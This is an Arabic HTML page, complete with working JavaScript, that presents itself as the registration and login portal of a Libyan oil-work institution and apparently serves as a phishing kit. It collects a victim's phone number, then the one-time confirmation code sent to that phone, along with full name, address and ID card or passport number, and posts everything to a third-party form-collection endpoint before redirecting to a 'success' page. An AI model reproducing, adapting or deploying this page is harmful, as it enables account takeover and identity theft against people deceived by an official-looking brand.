<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنــية</title>
  <link rel="icon" href="uy.jpeg" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin: 0 auto;
      display: block;
    }

    .logo-container p {
      margin-top: 8px;
      font-weight: 700;
      color: #003366;
      font-size: 16px;
    }

    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus {
      border-color: gold;
      outline: none;
    }

    input:disabled {
      background-color: #f2f2f2;
    }

    button {
      width: 40%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
      font-family: Calibri, sans-serif;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }

    button:hover:not(:disabled) {
      background-color: #e6c200;
    }

    button:disabled {
      background-color: #c2a300;
      cursor: not-allowed;
    }

    #timer {
      text-align: center;
      font-weight: 600;
      color: black;
      margin-bottom: 20px;
      min-height: 24px;
    }

    #codeField {
      display: none;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }

    #extraFields {
      display: none;
      margin-top: 25px;
      border: 2px solid #007bff;
      border-radius: 12px;
      padding: 20px;
      text-align: right;
    }

    #extraFields input[type="text"] {
      margin-bottom: 15px;
    }

    #extraFields label {
      margin-top: 8px;
    }

    #extraFields input[type="radio"] {
      margin-left: 6px;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo-container">
      <img src="uy.jpeg" alt="شعار المؤسسة" />
      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
    </div>

    <h2>تسجيل الدخول</h2>

    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم هاتفك الليبي" pattern="^09[1-5][0-9]{7}$" title="يجب أن يبدأ الرقم بـ 091 أو 092 أو 093 أو 094 أو 095 ويكون 10 أرقام" autocomplete="tel" />
      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
      <div id="timer"></div>
    </form>

    <form id="codeForm" onsubmit="return sendCode(event);">
      <div id="codeField">
        <label for="code">📩 انتظر وصول كود التأكيد عبر إشعار أو رسالة</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
        <div id="errorMessage" class="error"></div>
      </div>

      <div id="extraFields">
        <label for="fullName">الاسم بالكامل:</label>
        <input type="text" id="fullName" name="fullName" placeholder="مثال: أحمد محمد علي" required />

        <label for="address">العنوان - الشارع:</label>
        <input type="text" id="address" name="address" placeholder="مثال: شارع الجمهورية - طرابلس" required />

        <label>نوع الوثيقة:</label>
        <div style="margin-bottom: 15px;">
          <label><input type="radio" name="documentType" value="بطاقة" onchange="toggleDocField()"> بطاقة شخصية</label>
          &nbsp;&nbsp;
          <label><input type="radio" name="documentType" value="جواز" onchange="toggleDocField()"> جواز سفر</label>
        </div>

        <div id="documentField" style="display:none;">
          <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
          <input type="text" id="documentNumber" name="documentNumber" placeholder="" required />
        </div>
      </div>

      <button type="submit" id="sendCodeBtn" disabled>طلب الدخول</button>
    </form>
  </div>

  <script>
    let countdownInterval;
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const codeField = document.getElementById('codeField');
    const extraFields = document.getElementById('extraFields');
    const errorMessage = document.getElementById('errorMessage');
    const timerDisplay = document.getElementById('timer');

    function startTimer(duration) {
      let timeLeft = duration;
      timerDisplay.style.display = 'block';
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendPhoneBtn.disabled = false;
          phoneInput.disabled = false;
        }
      }, 1000);
    }

    function updateTimer(seconds) {
      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
      const secs = (seconds % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function sendPhone(event) {
      event.preventDefault();
      const phoneVal = phoneInput.value.trim();
      const phonePattern = /^09[1-5][0-9]{7}$/;

      if (!phonePattern.test(phoneVal)) {
        alert("❌ رقم الهاتف غير صحيح.");
        return false;
      }

      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify({ phone: phoneVal })
      }).then(response => {
        if (!response.ok) throw new Error();
        phoneInput.disabled = true;
        sendPhoneBtn.disabled = true;
        codeField.style.display = 'block';
        extraFields.style.display = 'block';
        startTimer(480);
      }).catch(() => {
        alert("⚠️ تعذر إرسال الرقم. حاول مرة أخرى.");
      });

      return false;
    }

    function toggleDocField() {
      const selected = document.querySelector('input[name="documentType"]:checked');
      const docField = document.getElementById('documentField');
      const docLabel = document.getElementById('documentLabel');
      const docInput = document.getElementById('documentNumber');

      if (selected) {
        docField.style.display = 'block';
        docLabel.textContent = selected.value === 'بطاقة' ? 'رقم البطاقة:' : 'رقم الجواز:';
        docInput.placeholder = selected.value === 'بطاقة' ? 'أدخل رقم البطاقة الشخصية' : 'أدخل رقم جواز السفر';
        validateAllFields();
      }
    }

    function validateAllFields() {
      const fullName = document.getElementById('fullName').value.trim();
      const address = document.getElementById('address').value.trim();
      const documentType = document.querySelector('input[name="documentType"]:checked');
      const documentNumber = document.getElementById('documentNumber').value.trim();
      const codeVal = codeInput.value.trim();

      if (fullName && address && documentType && documentNumber && codeVal) {
        sendCodeBtn.disabled = false;
      } else {
        sendCodeBtn.disabled = true;
      }
    }

    document.querySelectorAll('#codeForm input').forEach(input => {
      input.addEventListener('input', validateAllFields);
    });
    document.querySelectorAll('input[name="documentType"]').forEach(radio => {
      radio.addEventListener('change', validateAllFields);
    });

    function sendCode(event) {
      event.preventDefault();
      errorMessage.textContent = '';

      const fullName = document.getElementById('fullName').value.trim();
      const address = document.getElementById('address').value.trim();
      const documentType = document.querySelector('input[name="documentType"]:checked')?.value || '';
      const documentNumber = document.getElementById('documentNumber').value.trim();
      const codeVal = codeInput.value.trim();

      if (!fullName || !address || !documentType || !documentNumber || !codeVal) {
        errorMessage.textContent = 'يرجى ملء جميع الحقول.';
        return false;
      }

      const payload = {
        phone: phoneInput.value,
        code: codeVal,
        fullName,
        address,
        documentType,
        documentNumber
      };

      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(async res => {
        const data = await res.json();
        if (res.ok && data.success !== false) {
          window.location.href = "success.html";
        } else {
          errorMessage.textContent = "❌ الكود غير صحيح.";
        }
      }).catch(() => {
        errorMessage.textContent = "⚠️ حدث خطأ في الإرسال.";
      });

      return false;
    }
  </script>
</body>
</html>
